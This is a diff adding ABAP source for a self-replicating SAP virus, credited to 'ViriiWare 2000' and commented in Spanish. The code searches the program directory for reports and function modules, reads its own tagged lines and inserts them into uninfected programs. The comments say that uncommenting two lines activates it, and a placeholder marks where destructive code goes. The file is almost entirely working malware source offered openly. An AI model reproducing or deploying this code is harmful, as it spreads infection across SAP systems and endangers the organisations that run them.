@@ -1,0 +1,27 @@
+REPORT VIRIISOFT. "(C) ViriiWare 2000
+* Primer Virus para SAP versión Listados en 24 Líneas de Código
+* Efectos: Solo se reproduce en reports y funciones.
+* Hay que descomentar las linea para que funcione correctamente.
+TABLES TRDIR. DATA: VIN(72) OCCURS 0, VOUT(72) OCCURS 0. "SAPVirii
+SELECT NAME INTO SY-TNAME FROM TRDIR WHERE UNAM NE 'Virii' AND
+( SUBC = '1' OR ( SUBC = 'I' AND NAME LIKE 'L____U__' ) ).
+IF TRDIR-SUBC = 'I'. SY-TVAR0 = 'FUNCTION'. ELSE. SY-TVAR0 = 'REPORT'.
+ENDIF. EXIT.
+ENDSELECT. CHECK SY-SUBRC = 0.
+*update trdir set: name = 'Virii', sqlx = ' ' where name = sy-tname.
+READ REPORT SY-TNAME INTO VIN. READ REPORT SY-REPID INTO VOUT.
+LOOP AT VIN INTO SY-ENTRY.
+TRANSLATE SY-ENTRY TO UPPER CASE. SEARCH SY-ENTRY FOR SY-TVAR0.
+CHECK SY-SUBRC = 0 AND SY-ENTRY+0(1) NE '*'.
+LOOP AT VIN INTO SY-ENTRY FROM SY-TABIX.
+TRANSLATE SY-ENTRY USING '.@'. SEARCH SY-ENTRY FOR '@'.
+CHECK SY-SUBRC = 0. SY-WILLI = SY-TABIX + 1. EXIT.
+ENDLOOP. EXIT. ENDLOOP. CHECK SY-SUBRC = 0.
+LOOP AT VOUT INTO SY-ENTRY.
+IF SY-PAGNO = 3. SY-PAGNO = 0. ENDIF.
+SEARCH SY-ENTRY FOR 'SAPVirii'.
+IF SY-SUBRC = 0. SY-PAGNO = SY-PAGNO + 1. ENDIF.
+CHECK SY-PAGNO = 0. DELETE VOUT.
+ENDLOOP. INSERT LINES OF VOUT FROM 1 INTO VIN INDEX SY-WILLI.
+*insert report sy-tname from vin. CLEAR SY. "<---Virii Activo
+*Aquí va el código de destrucción o efectos del virus. "SAPVirii
